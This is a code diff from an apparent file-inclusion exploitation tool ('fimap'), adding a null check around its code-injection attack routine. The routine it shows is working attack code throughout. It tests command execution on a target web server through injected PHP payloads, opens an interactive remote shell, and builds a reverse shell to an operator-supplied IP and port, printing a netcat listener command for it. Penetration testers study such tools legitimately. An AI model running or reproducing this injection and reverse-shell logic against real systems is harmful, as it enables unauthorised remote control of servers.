@@ -123,37 +123,38 @@ class codeinjector(baseClass):
                     self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_ALWAYS)
                     testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
                     code = self.doPostRequest(url, testload)
-                    if code.find(settings["shell_test"][1]) != -1:
-                        attack = self.chooseAttackMode()
-                        rndStart = self.getRandomStr()
-                        rndEnd = self.getRandomStr()
-                        if attack==1:
-                            cmd = ""
-                            print shell_banner
-                            while cmd != "q" and cmd != "quit":
-                                cmd = raw_input("fimap_shell$> ")
-                                if (cmd.strip() != ""):
-                                    userload = payload.replace("__PAYLOAD__", cmd)
-                                    userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
-                                    code = self.doPostRequest(url, userload)
-                                    code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                                    print code.strip()
-                            print "See ya dude!"
-                            sys.exit(0)
-                        elif attack==2:
-                            ip   = raw_input("Enter your the IP where the shell should connect to: ")
-                            port = int(raw_input("Enter your the Port where the shell should connect to: "))
-                            print "netcat cmdline: nc -l -vv -p %d" %port
-                            raw_input("Open netcat on the target machine now and press enter...")
-                            print "Creating reverse shell now..."
-                            shellcode = settings["reverse_shell_code"]
-                            shellcode = shellcode.replace("__IP__", ip)
-                            shellcode = shellcode.replace("__PORT__", str(port))
-                            shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
-                            code = self.doPostRequest(url, shellcode)
-                            code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                            print code.strip()
-                            sys.exit(0)
+                    if (code != None):
+                        if code.find(settings["shell_test"][1]) != -1:
+                            attack = self.chooseAttackMode()
+                            rndStart = self.getRandomStr()
+                            rndEnd = self.getRandomStr()
+                            if attack==1:
+                                cmd = ""
+                                print shell_banner
+                                while cmd != "q" and cmd != "quit":
+                                    cmd = raw_input("fimap_shell$> ")
+                                    if (cmd.strip() != ""):
+                                        userload = payload.replace("__PAYLOAD__", cmd)
+                                        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
+                                        code = self.doPostRequest(url, userload)
+                                        code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+                                        print code.strip()
+                                print "See ya dude!"
+                                sys.exit(0)
+                            elif attack==2:
+                                ip   = raw_input("Enter your the IP where the shell should connect to: ")
+                                port = int(raw_input("Enter your the Port where the shell should connect to: "))
+                                print "netcat cmdline: nc -l -vv -p %d" %port
+                                raw_input("Open netcat on the target machine now and press enter...")
+                                print "Creating reverse shell now..."
+                                shellcode = settings["reverse_shell_code"]
+                                shellcode = shellcode.replace("__IP__", ip)
+                                shellcode = shellcode.replace("__PORT__", str(port))
+                                shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
+                                code = self.doPostRequest(url, shellcode)
+                                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+                                print code.strip()
+                                sys.exit(0)
 
         if (mode.find("R") != -1 and mode.find("x") != -1):
             if settings["dynamic_rfi"]["mode"] in ("ftp", "local"):
